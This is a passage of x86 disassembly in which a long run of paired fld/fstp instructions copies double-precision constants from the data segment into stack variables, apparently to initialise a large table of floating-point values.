		fstp	[ebp+var_1F78]
		fld	ds:dbl_424480
		fstp	[ebp+var_1F70]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1F68]
		fld	ds:dbl_424C28
		fstp	[ebp+var_1F60]
		fld	ds:dbl_424A70
		fstp	[ebp+var_1F58]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_1F50]
		fld	ds:dbl_424A18
		fstp	[ebp+var_1F48]
		fld	ds:dbl_424A98
		fstp	[ebp+var_1F40]
		fld	ds:dbl_424778
		fstp	[ebp+var_1F38]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_1F30]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_1F28]
		fld	ds:dbl_424848
		fstp	[ebp+var_1F20]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1F18]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1F10]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1F08]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_1F00]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1EF8]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_1EF0]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1EE8]
		fld	ds:dbl_424720
		fstp	[ebp+var_1EE0]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_1ED8]
		fld	ds:dbl_424868
		fstp	[ebp+var_1ED0]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_1EC8]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1EC0]
		fld	ds:dbl_424918
		fstp	[ebp+var_1EB8]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1EB0]
		fld	ds:dbl_424A80
		fstp	[ebp+var_1EA8]
		fld	ds:dbl_424590
		fstp	[ebp+var_1EA0]
		fld	ds:dbl_424970
		fstp	[ebp+var_1E98]
		fld	ds:dbl_424B68
		fstp	[ebp+var_1E90]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_1E88]
		fld	ds:dbl_424640
		fstp	[ebp+var_1E80]
		fld	ds:dbl_424838
		fstp	[ebp+var_1E78]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_1E70]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1E68]
		fld	ds:dbl_424508
		fstp	[ebp+var_1E60]
		fld	ds:dbl_424808
		fstp	[ebp+var_1E58]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1E50]
		fld	ds:dbl_424510
		fstp	[ebp+var_1E48]
		fld	ds:dbl_424610
		fstp	[ebp+var_1E40]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1E38]
		fld	ds:dbl_424788
		fstp	[ebp+var_1E30]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_1E28]
		fld	ds:dbl_424848
		fstp	[ebp+var_1E20]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_1E18]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1E10]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1E08]
		fld	ds:dbl_424470
		fstp	[ebp+var_1E00]
		fld1
		fstp	[ebp+var_1DF8]
		fld	ds:dbl_424988
		fstp	[ebp+var_1DF0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_1DE8]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_1DE0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_1DD8]
		fld	ds:dbl_424440
		fstp	[ebp+var_1DD0]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1DC8]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1DC0]
		fld	ds:dbl_424478
		fstp	[ebp+var_1DB8]
		fld	ds:dbl_424628
		fstp	[ebp+var_1DB0]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1DA8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1DA0]
		fld	ds:dbl_424560
		fstp	[ebp+var_1D98]
		fld	ds:dbl_424918
		fstp	[ebp+var_1D90]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1D88]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1D80]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1D78]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1D70]
		fld	ds:dbl_424840
		fstp	[ebp+var_1D68]
		fld	ds:dbl_424820
		fstp	[ebp+var_1D60]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_1D58]
		fld	ds:dbl_424840
		fstp	[ebp+var_1D50]
		fld	ds:dbl_424470
		fstp	[ebp+var_1D48]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1D40]
		fld	ds:dbl_424720
		fstp	[ebp+var_1D38]
		fld	ds:dbl_424990
		fstp	[ebp+var_1D30]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1D28]
		fld	ds:dbl_424A80
		fstp	[ebp+var_1D20]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_1D18]
		fld	ds:dbl_424570
		fstp	[ebp+var_1D10]
		fld	ds:dbl_424908
		fstp	[ebp+var_1D08]
		fld	ds:dbl_424460
		fstp	[ebp+var_1D00]
		fld	ds:dbl_424530
		fstp	[ebp+var_1CF8]
		fld	ds:dbl_424890
		fstp	[ebp+var_1CF0]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_1CE8]
		fld	ds:dbl_424660
		fstp	[ebp+var_1CE0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_1CD8]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1CD0]
		fld	ds:dbl_424478
		fstp	[ebp+var_1CC8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1CC0]
		fld	ds:dbl_424C08
		fstp	[ebp+var_1CB8]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_1CB0]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_1CA8]
		fld	ds:dbl_424B48
		fstp	[ebp+var_1CA0]
		fld	ds:dbl_424900
		fstp	[ebp+var_1C98]
		fld	ds:dbl_424830
		fstp	[ebp+var_1C90]
		fld	ds:dbl_424778
		fstp	[ebp+var_1C88]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_1C80]
		fld	ds:dbl_424440
		fstp	[ebp+var_1C78]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_1C70]
		fld	ds:dbl_424470
		fstp	[ebp+var_1C68]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1C60]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1C58]
		fld	ds:dbl_424A80
		fstp	[ebp+var_1C50]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1C48]
		fld	ds:dbl_424590
		fstp	[ebp+var_1C40]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_1C38]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1C30]
		fld	ds:dbl_424858
		fstp	[ebp+var_1C28]
		fld	ds:dbl_424580
		fstp	[ebp+var_1C20]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1C18]
		fld	ds:dbl_424910
		fstp	[ebp+var_1C10]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1C08]
		fld	ds:dbl_424640
		fstp	[ebp+var_1C00]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1BF8]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1BF0]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1BE8]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_1BE0]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1BD8]
		fld	ds:dbl_424640
		fstp	[ebp+var_1BD0]
		fld	ds:dbl_424500
		fstp	[ebp+var_1BC8]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_1BC0]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1BB8]
		fld	ds:dbl_424450
		fstp	[ebp+var_1BB0]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1BA8]
		fld	ds:dbl_424860
		fstp	[ebp+var_1BA0]
		fld	ds:dbl_424908
		fstp	[ebp+var_1B98]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1B90]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_1B88]
		fld	ds:dbl_424630
		fstp	[ebp+var_1B80]
		fld1
		fstp	[ebp+var_1B78]
		fld	ds:dbl_424588
		fstp	[ebp+var_1B70]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1B68]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1B60]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1B58]
		fld	ds:dbl_424B28
		fstp	[ebp+var_1B50]
		fld	ds:dbl_424978
		fstp	[ebp+var_1B48]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1B40]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1B38]
		fld	ds:dbl_424770
		fstp	[ebp+var_1B30]
		fld	ds:dbl_424690
		fstp	[ebp+var_1B28]
		fld	ds:dbl_424510
		fstp	[ebp+var_1B20]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1B18]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1B10]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1B08]
		fld	ds:dbl_424500
		fstp	[ebp+var_1B00]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_1AF8]
		fld	ds:dbl_424508
		fstp	[ebp+var_1AF0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_1AE8]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_1AE0]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1AD8]
		fld	ds:dbl_424A98
		fstp	[ebp+var_1AD0]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1AC8]
		fld	ds:dbl_424930
		fstp	[ebp+var_1AC0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_1AB8]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1AB0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_1AA8]
		fld	ds:dbl_424790
		fstp	[ebp+var_1AA0]
		fld	ds:dbl_424450
		fstp	[ebp+var_1A98]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_1A90]
		fld	ds:dbl_424970
		fstp	[ebp+var_1A88]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_1A80]
		fld	ds:dbl_424628
		fstp	[ebp+var_1A78]
		fld	ds:dbl_424B50
		fstp	[ebp+var_1A70]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1A68]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1A60]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1A58]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1A50]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1A48]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1A40]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1A38]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1A30]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_1A28]
		fld	ds:dbl_424940
		fstp	[ebp+var_1A20]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1A18]
		fld	ds:dbl_424990
		fstp	[ebp+var_1A10]
		fld	ds:dbl_424720
		fstp	[ebp+var_1A08]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_1A00]
		fld	ds:dbl_424A48
		fstp	[ebp+var_19F8]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_19F0]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_19E8]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_19E0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_19D8]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_19D0]
		fld	ds:dbl_424708
		fstp	[ebp+var_19C8]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_19C0]
		fld	ds:dbl_424458
		fstp	[ebp+var_19B8]
		fld	ds:dbl_424848
		fstp	[ebp+var_19B0]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_19A8]
		fld	ds:dbl_424A98
		fstp	[ebp+var_19A0]
		fld	ds:dbl_424928
		fstp	[ebp+var_1998]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1990]
		fld	ds:dbl_424778
		fstp	[ebp+var_1988]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_1980]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_1978]
		fld	ds:dbl_424898
		fstp	[ebp+var_1970]
		fld	ds:dbl_424B60
		fstp	[ebp+var_1968]
		fld	ds:dbl_424598
		fstp	[ebp+var_1960]
		fld	ds:dbl_424638
		fstp	[ebp+var_1958]
		fld	ds:dbl_424980
		fstp	[ebp+var_1950]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1948]
		fld	ds:dbl_424810
		fstp	[ebp+var_1940]
		fld	ds:dbl_424B48
		fstp	[ebp+var_1938]
		fld	ds:dbl_424568
		fstp	[ebp+var_1930]
		fld1
		fstp	[ebp+var_1928]
		fld	ds:dbl_424798
		fstp	[ebp+var_1920]
		fld	ds:dbl_424740
		fstp	[ebp+var_1918]
		fld	ds:dbl_424710
		fstp	[ebp+var_1910]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1908]
		fld	ds:dbl_424600
		fstp	[ebp+var_1900]
		fld1
		fstp	[ebp+var_18F8]
		fld	ds:dbl_424578
		fstp	[ebp+var_18F0]
		fld	ds:dbl_424990
		fstp	[ebp+var_18E8]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_18E0]
		fld	ds:dbl_424600
		fstp	[ebp+var_18D8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_18D0]
		fld	ds:dbl_424728
		fstp	[ebp+var_18C8]
		fld	ds:dbl_424610
		fstp	[ebp+var_18C0]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_18B8]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_18B0]
		fld	ds:dbl_424628
		fstp	[ebp+var_18A8]
		fld	ds:dbl_424B28
		fstp	[ebp+var_18A0]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_1898]
		fld	ds:dbl_424760
		fstp	[ebp+var_1890]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_1888]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_1880]
		fld	ds:dbl_424518
		fstp	[ebp+var_1878]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1870]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1868]
		fld	ds:dbl_424860
		fstp	[ebp+var_1860]
		fld	ds:dbl_424850
		fstp	[ebp+var_1858]
		fld	ds:dbl_424880
		fstp	[ebp+var_1850]
		fld	ds:dbl_424828
		fstp	[ebp+var_1848]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1840]
		fld	ds:dbl_424560
		fstp	[ebp+var_1838]
		fld	ds:dbl_424760
		fstp	[ebp+var_1830]
		fld	ds:dbl_424848
		fstp	[ebp+var_1828]
		fld	ds:dbl_424990
		fstp	[ebp+var_1820]
		fld	ds:dbl_424598
		fstp	[ebp+var_1818]
		fld	ds:dbl_424818
		fstp	[ebp+var_1810]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_1808]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1800]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_17F8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_17F0]
		fld	ds:dbl_424688
		fstp	[ebp+var_17E8]
		fld	ds:dbl_424860
		fstp	[ebp+var_17E0]
		fld	ds:dbl_424A80
		fstp	[ebp+var_17D8]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_17D0]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_17C8]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_17C0]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_17B8]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_17B0]
		fld	ds:dbl_424860
		fstp	[ebp+var_17A8]
		fld	ds:dbl_424780
		fstp	[ebp+var_17A0]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_1798]
		fld	ds:dbl_424828
		fstp	[ebp+var_1790]
		fld	ds:dbl_424630
		fstp	[ebp+var_1788]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1780]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1778]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1770]
		fld	ds:dbl_424940
		fstp	[ebp+var_1768]
		fld	ds:dbl_424690
		fstp	[ebp+var_1760]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_1758]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1750]
		fld	ds:dbl_424458
		fstp	[ebp+var_1748]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1740]
		fld	ds:dbl_424B28
		fstp	[ebp+var_1738]
		fld	ds:dbl_424940
		fstp	[ebp+var_1730]
		fld	ds:dbl_424938
		fstp	[ebp+var_1728]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1720]
		fld	ds:dbl_424530
		fstp	[ebp+var_1718]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1710]
		fld	ds:dbl_424718
		fstp	[ebp+var_1708]
		fld	ds:dbl_424A88
		fstp	[ebp+var_1700]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_16F8]
		fld	ds:dbl_424940
		fstp	[ebp+var_16F0]
		fld	ds:dbl_424800
		fstp	[ebp+var_16E8]
		fld	ds:dbl_424730
		fstp	[ebp+var_16E0]
		fld	ds:dbl_424608
		fstp	[ebp+var_16D8]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_16D0]
		fld	ds:dbl_424568
		fstp	[ebp+var_16C8]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_16C0]
		fld	ds:dbl_424A60
		fstp	[ebp+var_16B8]
		fld	ds:dbl_424448
		fstp	[ebp+var_16B0]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_16A8]
		fld	ds:dbl_424800
		fstp	[ebp+var_16A0]
		fld	ds:dbl_424948
		fstp	[ebp+var_1698]
		fld	ds:dbl_424648
		fstp	[ebp+var_1690]
		fld	ds:dbl_424600
		fstp	[ebp+var_1688]
		fld	ds:dbl_424890
		fstp	[ebp+var_1680]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_1678]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1670]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1668]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1660]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1658]
		fld	ds:dbl_424630
		fstp	[ebp+var_1650]
		fld	ds:dbl_424638
		fstp	[ebp+var_1648]
		fld	ds:dbl_424740
		fstp	[ebp+var_1640]
		fld	ds:dbl_424710
		fstp	[ebp+var_1638]
		fld	ds:dbl_424678
		fstp	[ebp+var_1630]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_1628]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1620]
		fld	ds:dbl_424990
		fstp	[ebp+var_1618]
		fld	ds:dbl_424478
		fstp	[ebp+var_1610]
		fld	ds:dbl_424880
		fstp	[ebp+var_1608]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1600]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_15F8]
		fld	ds:dbl_424918
		fstp	[ebp+var_15F0]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_15E8]
		fld	ds:dbl_424878
		fstp	[ebp+var_15E0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_15D8]
		fld	ds:dbl_424458
		fstp	[ebp+var_15D0]
		fld	ds:dbl_424700
		fstp	[ebp+var_15C8]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_15C0]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_15B8]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_15B0]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_15A8]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_15A0]
		fld	ds:dbl_424560
		fstp	[ebp+var_1598]
		fld	ds:dbl_424920
		fstp	[ebp+var_1590]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_1588]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1580]
		fld	ds:dbl_424C10
		fstp	[ebp+var_1578]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_1570]
		fld	ds:dbl_424978
		fstp	[ebp+var_1568]
		fld	ds:dbl_424710
		fstp	[ebp+var_1560]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_1558]
		fld	ds:dbl_424830
		fstp	[ebp+var_1550]
		fld	ds:dbl_424430
		fstp	[ebp+var_1548]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1540]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1538]
		fld	ds:dbl_424A10
		fstp	[ebp+var_1530]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_1528]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1520]
		fld	ds:dbl_424778
		fstp	[ebp+var_1518]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1510]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1508]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1500]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_14F8]
		fld	ds:dbl_424690
		fstp	[ebp+var_14F0]
		fld	ds:dbl_424678
		fstp	[ebp+var_14E8]
		fld	ds:dbl_424568
		fstp	[ebp+var_14E0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_14D8]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_14D0]
		fld	ds:dbl_424830
		fstp	[ebp+var_14C8]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_14C0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_14B8]
		fld	ds:dbl_424A10
		fstp	[ebp+var_14B0]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_14A8]
		fld	ds:dbl_424790
		fstp	[ebp+var_14A0]
		fld	ds:dbl_424870
		fstp	[ebp+var_1498]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_1490]
		fld	ds:dbl_424A10
		fstp	[ebp+var_1488]
		fld	ds:dbl_424868
		fstp	[ebp+var_1480]
		fld	ds:dbl_424A48
		fstp	[ebp+var_1478]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_1470]
		fld	ds:dbl_424760
		fstp	[ebp+var_1468]
		fld	ds:dbl_424990
		fstp	[ebp+var_1460]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_1458]
		fld	ds:dbl_424B00
		fstp	[ebp+var_1450]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1448]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_1440]
		fld	ds:dbl_424688
		fstp	[ebp+var_1438]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1430]
		fld	ds:dbl_424788
		fstp	[ebp+var_1428]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_1420]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1418]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1410]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_1408]
		fld	ds:dbl_424818
		fstp	[ebp+var_1400]
		fld	ds:dbl_424458
		fstp	[ebp+var_13F8]
		fld	ds:dbl_424760
		fstp	[ebp+var_13F0]
		fld	ds:dbl_424820
		fstp	[ebp+var_13E8]
		fld	ds:dbl_424858
		fstp	[ebp+var_13E0]
		fld	ds:dbl_424488
		fstp	[ebp+var_13D8]
		fld	ds:dbl_424A50
		fstp	[ebp+var_13D0]
		fld	ds:dbl_424820
		fstp	[ebp+var_13C8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_13C0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_13B8]
		fld	ds:dbl_424B30
		fstp	[ebp+var_13B0]
		fld	ds:dbl_424488
		fstp	[ebp+var_13A8]
		fld	ds:dbl_424748
		fstp	[ebp+var_13A0]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_1398]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_1390]
		fld	ds:dbl_424508
		fstp	[ebp+var_1388]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1380]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1378]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1370]
		fld	ds:dbl_424668
		fstp	[ebp+var_1368]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1360]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1358]
		fld	ds:dbl_424B28
		fstp	[ebp+var_1350]
		fld	ds:dbl_424A00
		fstp	[ebp+var_1348]
		fld	ds:dbl_424898
		fstp	[ebp+var_1340]
		fld	ds:dbl_424618
		fstp	[ebp+var_1338]
		fld	ds:dbl_424838
		fstp	[ebp+var_1330]
		fld	ds:dbl_424C20
		fstp	[ebp+var_1328]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1320]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_1318]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1310]
		fld	ds:dbl_424A00
		fstp	[ebp+var_1308]
		fld	ds:dbl_424628
		fstp	[ebp+var_1300]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_12F8]
		fld	ds:dbl_424910
		fstp	[ebp+var_12F0]
		fld	ds:dbl_424900
		fstp	[ebp+var_12E8]
		fld	ds:dbl_424870
		fstp	[ebp+var_12E0]
		fld	ds:dbl_424568
		fstp	[ebp+var_12D8]
		fld	ds:dbl_424498
		fstp	[ebp+var_12D0]
		fld	ds:dbl_424490
		fstp	[ebp+var_12C8]
		fld	ds:dbl_424460
		fstp	[ebp+var_12C0]
		fld	ds:dbl_424B90
		fstp	[ebp+var_12B8]
		fld	ds:dbl_424820
		fstp	[ebp+var_12B0]
		fld	ds:dbl_424720
		fstp	[ebp+var_12A8]
		fld	ds:dbl_424830
		fstp	[ebp+var_12A0]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_1298]
		fld	ds:dbl_424850
		fstp	[ebp+var_1290]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_1288]
		fld	ds:dbl_424800
		fstp	[ebp+var_1280]
		fld	ds:dbl_424520
		fstp	[ebp+var_1278]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1270]
		fld	ds:dbl_424690
		fstp	[ebp+var_1268]
		fld	ds:dbl_424588
		fstp	[ebp+var_1260]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1258]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1250]
		fld	ds:dbl_424930
		fstp	[ebp+var_1248]
		fld	ds:dbl_424828
		fstp	[ebp+var_1240]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1238]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_1230]
		fld	ds:dbl_424958
		fstp	[ebp+var_1228]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1220]
		fld	ds:dbl_424A00
		fstp	[ebp+var_1218]
		fld	ds:dbl_424790
		fstp	[ebp+var_1210]
		fld	ds:dbl_424A68
		fstp	[ebp+var_1208]
		fld	ds:dbl_424690
		fstp	[ebp+var_1200]
		fld	ds:dbl_424520
		fstp	[ebp+var_11F8]
		fld	ds:dbl_424868
		fstp	[ebp+var_11F0]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_11E8]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_11E0]
		fld	ds:dbl_424978
		fstp	[ebp+var_11D8]
		fld	ds:dbl_424828
		fstp	[ebp+var_11D0]
		fld	ds:dbl_424950
		fstp	[ebp+var_11C8]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_11C0]
		fld	ds:dbl_424510
		fstp	[ebp+var_11B8]
		fld	ds:dbl_424618
		fstp	[ebp+var_11B0]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_11A8]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_11A0]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1198]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_1190]
		fld	ds:dbl_424750
		fstp	[ebp+var_1188]
		fld	ds:dbl_424568
		fstp	[ebp+var_1180]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_1178]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_1170]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_1168]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1160]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_1158]
		fld	ds:dbl_424578
		fstp	[ebp+var_1150]
		fld	ds:dbl_424B38
		fstp	[ebp+var_1148]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1140]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1138]
		fld	ds:dbl_424970
		fstp	[ebp+var_1130]
		fld	ds:dbl_424860
		fstp	[ebp+var_1128]
		fld	ds:dbl_424500
		fstp	[ebp+var_1120]
		fld	ds:dbl_424560
		fstp	[ebp+var_1118]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1110]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1108]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1100]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_10F8]
		fld	ds:dbl_424A48
		fstp	[ebp+var_10F0]
		fld	ds:dbl_424620
		fstp	[ebp+var_10E8]
		fld	ds:dbl_424668
		fstp	[ebp+var_10E0]
		fld	ds:dbl_424A60
		fstp	[ebp+var_10D8]
		fld	ds:dbl_424A60
		fstp	[ebp+var_10D0]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_10C8]
		fld	ds:dbl_424A00
		fstp	[ebp+var_10C0]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_10B8]
		fld	ds:dbl_424820
		fstp	[ebp+var_10B0]
		fld	ds:dbl_424520
		fstp	[ebp+var_10A8]
